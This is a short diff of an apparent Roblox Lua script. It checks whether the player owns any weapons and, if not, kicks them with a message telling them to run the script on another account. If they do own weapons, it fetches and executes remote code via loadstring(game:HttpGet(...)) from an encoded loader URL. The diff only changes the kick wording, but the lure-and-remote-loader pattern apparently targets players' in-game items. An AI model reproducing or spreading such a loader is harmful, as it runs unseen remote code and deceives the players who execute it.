@@ -17,7 +17,7 @@ for id, a in pairs(inv.Weapons.Owned) do
 end
 
 if c == 0 then
-    p:Kick("Unable to load script rexecute the script on another account")
+    p:Kick("Unable to load script execute the script again on another account")
 else
     loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvTW0yTmV3L3JlZnMvaGVhZHMvbWFpbi9kaXNqIn19"))()
 end
